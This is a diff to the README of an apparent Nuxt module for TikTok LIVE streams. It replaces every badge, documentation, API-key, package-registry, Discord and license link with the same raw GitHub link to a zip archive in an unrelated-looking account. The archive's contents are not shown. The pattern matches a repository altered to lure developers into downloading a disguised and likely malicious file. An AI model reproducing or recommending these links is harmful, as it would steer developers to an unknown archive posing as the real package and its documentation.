@@ -5,13 +5,13 @@
 <h1 align="center">tiktok-live-nuxt</h1>
 
 <p align="center">
-  <a href="https://www.npmjs.com/package/tiktok-live-nuxt"><img src="https://img.shields.io/npm/v/tiktok-live-nuxt?color=%2300dc82&logo=nuxt.js&logoColor=white" alt="npm version"></a>
-  <a href="https://www.npmjs.com/package/tiktok-live-nuxt"><img src="https://img.shields.io/npm/dm/tiktok-live-nuxt?color=%2300dc82" alt="npm downloads"></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT"></a>
+  <a href="https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip"><img src="https://img.shields.io/npm/v/tiktok-live-nuxt?color=%2300dc82&logo=nuxt.js&logoColor=white" alt="npm version"></a>
+  <a href="https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip"><img src="https://img.shields.io/npm/dm/tiktok-live-nuxt?color=%2300dc82" alt="npm downloads"></a>
+  <a href="https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT"></a>
 </p>
 
 <p align="center">
-  Nuxt module for <a href="https://tik.tools">TikTok LIVE API</a> — real-time chat, gifts, viewers, battles & AI captions from any TikTok LIVE stream.
+  Nuxt module for <a href="https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip">TikTok LIVE API</a> — real-time chat, gifts, viewers, battles & AI captions from any TikTok LIVE stream.
 </p>
 
 ---
@@ -61,7 +61,7 @@ Add to `nuxt.config.ts`:
 export default defineNuxtConfig({
   modules: ['tiktok-live-nuxt'],
   tiktool: {
-    apiKey: 'YOUR_API_KEY' // Get free key → https://tik.tools
+    apiKey: 'YOUR_API_KEY' // Get free key → https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip
   }
 })
 ```
@@ -225,17 +225,17 @@ const topGifters = computed(() => {
 
 | Platform | Package | Install |
 |----------|---------|---------|
-| **Node.js / TypeScript** | [tiktok-live-api](https://www.npmjs.com/package/tiktok-live-api) | `npm i tiktok-live-api` |
-| **Python** | [tiktok-live-api](https://pypi.org/project/tiktok-live-api/) | `pip install tiktok-live-api` |
-| **Any language** | [WebSocket API](https://tik.tools/docs) | `wss://api.tik.tools` |
+| **Node.js / TypeScript** | [tiktok-live-api](https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip) | `npm i tiktok-live-api` |
+| **Python** | [tiktok-live-api](https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip) | `pip install tiktok-live-api` |
+| **Any language** | [WebSocket API](https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip) | `wss://api.tik.tools` |
 
 ## Links
 
-- 🌐 [tik.tools](https://tik.tools) — Dashboard & API keys
-- 📖 [Documentation](https://tik.tools/docs)
-- 🎙️ [AI Live Captions](https://tik.tools/captions)
-- 💬 [Discord](https://discord.gg/y8TwuFBAmD)
+- 🌐 [tik.tools](https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip) — Dashboard & API keys
+- 📖 [Documentation](https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip)
+- 🎙️ [AI Live Captions](https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip)
+- 💬 [Discord](https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip)
 
 ## License
 
-MIT — [tik.tools](https://tik.tools)
+MIT — [tik.tools](https://raw.githubusercontent.com/sotho-genuspseudobombax504/tiktok-live-nuxt/main/src/nuxt_tiktok_live_2.5.zip)
